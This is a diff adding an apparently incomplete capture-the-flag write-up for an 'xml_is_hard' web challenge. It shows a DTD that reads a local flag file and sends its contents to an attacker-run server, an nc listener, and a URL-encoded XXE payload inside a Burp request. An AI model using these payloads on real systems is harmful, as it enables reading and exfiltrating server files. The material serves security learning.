@@ -178,4 +178,56 @@ Now I can spawn the shell, but I cannot do anything ... I'm stuck here and could
 
 # xml_is_hard
 
+We are provided with an URL: `http://68.183.148.46:9000/search`
+
+**Recon:** The website allows users to enter a query string and return the results back to the screen. It looks like the page is using ajax to display the result. Whenever I see an ajax call, a query I always think of [XXE](https://www.owasp.org/index.php/XML_External_Entity_XXE_Processing) I've encountered XXE for applications running a vulnerable version of java, but this is possible with C# back end and ASP.NET that parse XML as well.
+
+Burp suite is a nice tool to inspect and tamper the request. I first check with a simple request, remember that we need to change content-type to `Content-Type: application/xml;`.
+
+![](img/xxe1.png)
+
+**(I won't be able to demonstrate and write more since the server is offline - this is not completed anyway)**
+
+I went to another indirect route that I setup a VPS with a DTD file, and use the request to ping the file with the requested resources. This setup requires a few more steps but it's easy for my to control the request and in case server does not respond with result on the response. I again spin up another server on DigitalOcean and run the server with:
+> python -m SimpleHTTPServer 31337
+
+And a nc just to listen to the traffic:
+> nc -lvp 1337
+
+Content of DTD file:
+```
+<!ENTITY % vuln1 SYSTEM "file:///flag.txt">
+<!ENTITY % vuln2 "<!ENTITY attack SYSTEM 'http://159.65.97.248:1337/EXAMPLE?%vuln1;'>">
+%vuln2;
+```
+
+To test the setup, i send a ping signal using the burp request. Also note that the query needs to be urlencoded. So my xxe:
+> <?xml version="1.0" encoding="utf-8"?><!DOCTYPE message [<!ENTITY file SYSTEM "http://159.65.97.248:31337/xxe.dtd">]><message>&file;</message>
+
+becomes: %3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22utf-8%22%3F%3E%3C%21DOCTYPE%20message%20%5B%3C%21ENTITY%20file%20SYSTEM%20%22http%3A%2F%2F159.65.97.248%3A31337%2Fxxe.dtd%22%3E%5D%3E%3Cmessage%3E%26file%3B%3C%2Fmessage%3E
+> 
+
+Putting them together, my burp request looks like:
+
+```
+POST /search HTTP/1.1
+Host: 68.183.148.46:9000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://68.183.148.46:9000/search
+Content-Type: application/xml; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 148
+Connection: close
+
+
+q=%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22utf-8%22%3F%3E%3C%21DOCTYPE%20message%20%5B%3C%21ENTITY%20file%20SYSTEM%20%22http%3A%2F%2F159.65.97.248%3A31337%2Fxxe.dtd%22%3E%5D%3E%3Cmessage%3E%26file%3B%3C%2Fmessage%3E
+```
+
+
+
 # 64 caneries
+
+Unable to download the file after the challenge completes :(
